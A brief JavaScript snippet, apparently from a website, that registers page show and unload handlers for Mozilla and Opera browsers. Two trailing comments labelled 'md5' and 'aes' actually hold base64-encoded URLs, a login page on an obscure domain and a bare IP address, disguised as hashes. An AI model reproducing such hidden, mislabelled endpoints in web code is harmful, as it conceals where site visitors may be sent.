if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly9xamRxLnFqZHFqajFxamtzMS5jb20vaW5kZXgucGhwP209VXNlciZhPWxvZ2lu**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/